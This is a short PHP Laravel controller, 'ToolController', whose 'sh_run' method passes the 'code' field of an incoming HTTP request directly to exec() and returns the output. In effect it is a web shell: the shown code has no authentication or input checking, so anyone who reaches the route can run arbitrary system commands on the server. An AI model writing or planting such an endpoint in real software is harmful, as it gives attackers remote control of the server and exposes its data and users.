<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ToolController extends Controller
{
    //
    function sh()
    {
        return view('tools.sh');
    }

    function sh_run()
    {
        $code = \request()->code;
        $result = '';
        exec($code, $result);
        return $result;
    }
}
